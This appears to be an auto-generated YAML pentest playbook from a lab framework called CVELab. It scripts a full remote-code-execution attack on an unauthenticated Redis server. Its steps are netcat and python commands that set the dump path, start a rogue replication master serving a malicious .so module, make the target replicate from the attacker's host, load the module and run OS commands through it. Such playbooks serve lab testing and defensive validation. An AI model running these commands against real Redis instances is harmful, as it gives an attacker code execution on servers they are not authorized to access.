playbook:
  id: 4-unacc
  name: 4-unacc SysField Playbook
  description: Generated from CVELab atom (RCE).
  scenario_type: pentest
  author: CVELab
  version: '1.0'
  mitre_attack:
    initial_access:
    - T1078
    execution:
    - T1059
    - T1505
    command_and_control:
    - T1571
variables:
  target_ip: '{{ target_ip }}'
  target_port: 6379
  requirements:
    network_access: TCP to Redis port 6379 on target, and target must be able to reach
      attacker's rogue master port
    authentication: none - Redis has no password configured (requirepass is empty)
    tools_needed:
    - nc (netcat)
    - python3
    - gcc (for compiling exploit module)
monitor:
  preset: standard
actors:
  attacker:
    node: attacker
    description: CVELab attacker node
    capabilities:
    - network
    - exploit
steps:
- id: 01-4-unacc-verify-unauthenticated-access
  stage: initial_access
  actor: attacker
  description: Connect to Redis and confirm no password is required, retrieving server
    version info
  mitre:
    tactic: initial_access
    technique: T1078
    technique_name: T1078
  executor:
    type: direct
    command: 'mkdir -p /tmp/cvelab-sysfield

      (echo -e "INFO server\r\n" | nc -w 3 {{ target_ip }} 6379) > /tmp/cvelab-sysfield/01-4-unacc-verify-unauthenticated-access.out
      2>&1

      status=$?

      cat /tmp/cvelab-sysfield/01-4-unacc-verify-unauthenticated-access.out

      exit $status'
  expected_output:
    exit_code: 0
  postconditions:
    files:
    - path: /tmp/cvelab-sysfield/01-4-unacc-verify-unauthenticated-access.out
      op: write
  timeout: 120
- id: 02-4-unacc-check-authentication-config
  stage: initial_access
  actor: attacker
  description: Verify that requirepass is empty, confirming no authentication is enforced
  mitre:
    tactic: initial_access
    technique: T1078
    technique_name: T1078
  executor:
    type: direct
    command: 'mkdir -p /tmp/cvelab-sysfield

      (echo -e "CONFIG GET requirepass\r\n" | nc -w 3 {{ target_ip }} 6379) > /tmp/cvelab-sysfield/02-4-unacc-check-authentication-config.out
      2>&1

      status=$?

      cat /tmp/cvelab-sysfield/02-4-unacc-check-authentication-config.out

      exit $status'
  expected_output:
    exit_code: 0
  postconditions:
    files:
    - path: /tmp/cvelab-sysfield/02-4-unacc-check-authentication-config.out
      op: write
  timeout: 120
  dependencies:
  - 01-4-unacc-verify-unauthenticated-access
- id: 03-4-unacc-set-file-write-path-via-config-set
  stage: initial_access
  actor: attacker
  description: Use CONFIG SET to control the directory and filename where the RDB
    dump will be written, enabling arbitrary file write
  mitre:
    tactic: initial_access
    technique: T1505
    technique_name: T1505
  executor:
    type: direct
    command: 'mkdir -p /tmp/cvelab-sysfield

      (echo -e "CONFIG SET dir /data\r\nCONFIG SET dbfilename exp.so\r\n" | nc -w
      3 {{ target_ip }} 6379) > /tmp/cvelab-sysfield/03-4-unacc-set-file-write-path-via-config-set.out
      2>&1

      status=$?

      cat /tmp/cvelab-sysfield/03-4-unacc-set-file-write-path-via-config-set.out

      exit $status'
  expected_output:
    exit_code: 0
  postconditions:
    files:
    - path: /tmp/cvelab-sysfield/03-4-unacc-set-file-write-path-via-config-set.out
      op: write
  timeout: 120
  dependencies:
  - 02-4-unacc-check-authentication-config
- id: 04-4-unacc-start-rogue-redis-master-server
  stage: initial_access
  actor: attacker
  description: Start a fake Redis master that will deliver a malicious .so module
    during the SYNC/PSYNC replication handshake. The rogue master responds to PING,
    REPLCONF, and sends FULLRESYNC with the .so payload as RDB data.
  mitre:
    tactic: initial_access
    technique: T1571
    technique_name: T1571
  executor:
    type: direct
    command: 'mkdir -p /tmp/cvelab-sysfield

      (python3 /tmp/rogue_master.py --listen {{ rogue_port }} --module /tmp/exploit/exploit.so)
      > /tmp/cvelab-sysfield/04-4-unacc-start-rogue-redis-master-server.out 2>&1

      status=$?

      cat /tmp/cvelab-sysfield/04-4-unacc-start-rogue-redis-master-server.out

      exit $status'
  expected_output:
    exit_code: 0
  postconditions:
    files:
    - path: /tmp/cvelab-sysfield/04-4-unacc-start-rogue-redis-master-server.out
      op: write
  timeout: 120
  dependencies:
  - 03-4-unacc-set-file-write-path-via-config-set
- id: 05-4-unacc-force-target-to-replicate-from-rogue-master
  stage: initial_access
  actor: attacker
  description: Issue SLAVEOF command to make the target Redis instance replicate from
    the attacker-controlled rogue master. This triggers SYNC and the malicious .so
    is written to disk as the RDB dump file.
  mitre:
    tactic: initial_access
    technique: T1571
    technique_name: T1571
  executor:
    type: direct
    command: 'mkdir -p /tmp/cvelab-sysfield

      (echo -e "SLAVEOF {{ attacker_ip }} {{ rogue_port }}\r\n" | nc -w 3 {{ target_ip
      }} 6379) > /tmp/cvelab-sysfield/05-4-unacc-force-target-to-replicate-from-rogue-master.out
      2>&1

      status=$?

      cat /tmp/cvelab-sysfield/05-4-unacc-force-target-to-replicate-from-rogue-master.out

      exit $status'
  expected_output:
    exit_code: 0
  postconditions:
    files:
    - path: /tmp/cvelab-sysfield/05-4-unacc-force-target-to-replicate-from-rogue-master.out
      op: write
  timeout: 120
  dependencies:
  - 04-4-unacc-start-rogue-redis-master-server
- id: 06-4-unacc-release-slave-and-load-malicious-module
  stage: initial_access
  actor: attacker
  description: After SYNC completes, release the target from slave mode with SLAVEOF
    NO ONE, then load the malicious .so module using MODULE LOAD to achieve arbitrary
    code execution
  mitre:
    tactic: initial_access
    technique: T1505
    technique_name: T1505
  executor:
    type: direct
    command: 'mkdir -p /tmp/cvelab-sysfield

      (echo -e "SLAVEOF NO ONE\r\nMODULE LOAD /data/exp.so\r\n" | nc -w 3 {{ target_ip
      }} 6379) > /tmp/cvelab-sysfield/06-4-unacc-release-slave-and-load-malicious-module.out
      2>&1

      status=$?

      cat /tmp/cvelab-sysfield/06-4-unacc-release-slave-and-load-malicious-module.out

      exit $status'
  expected_output:
    exit_code: 0
  postconditions:
    files:
    - path: /tmp/cvelab-sysfield/06-4-unacc-release-slave-and-load-malicious-module.out
      op: write
  timeout: 120
  dependencies:
  - 05-4-unacc-force-target-to-replicate-from-rogue-master
- id: 07-4-unacc-execute-arbitrary-commands-via-loaded-module
  stage: initial_access
  actor: attacker
  description: Use the custom command registered by the loaded module (e.g., system.exec)
    to execute OS commands and confirm RCE
  mitre:
    tactic: initial_access
    technique: T1059
    technique_name: T1059
  executor:
    type: direct
    command: 'mkdir -p /tmp/cvelab-sysfield

      (echo -e "system.exec id\r\n" | nc -w 3 {{ target_ip }} 6379) > /tmp/cvelab-sysfield/07-4-unacc-execute-arbitrary-commands-via-loaded-module.out
      2>&1

      status=$?

      cat /tmp/cvelab-sysfield/07-4-unacc-execute-arbitrary-commands-via-loaded-module.out

      exit $status'
  expected_output:
    exit_code: 0
  postconditions:
    files:
    - path: /tmp/cvelab-sysfield/07-4-unacc-execute-arbitrary-commands-via-loaded-module.out
      op: write
  timeout: 120
  dependencies:
  - 06-4-unacc-release-slave-and-load-malicious-module
validation:
  success_criteria:
  - step: 01-4-unacc-verify-unauthenticated-access
    condition: exit_code
    value: 0
  - step: 02-4-unacc-check-authentication-config
    condition: exit_code
    value: 0
  - step: 03-4-unacc-set-file-write-path-via-config-set
    condition: exit_code
    value: 0
  - step: 04-4-unacc-start-rogue-redis-master-server
    condition: exit_code
    value: 0
  - step: 05-4-unacc-force-target-to-replicate-from-rogue-master
    condition: exit_code
    value: 0
  - step: 06-4-unacc-release-slave-and-load-malicious-module
    condition: exit_code
    value: 0
  - step: 07-4-unacc-execute-arbitrary-commands-via-loaded-module
    condition: exit_code
    value: 0
  failure_handling:
    on_step_failure: continue
    max_retries: 0
    retry_delay: 1
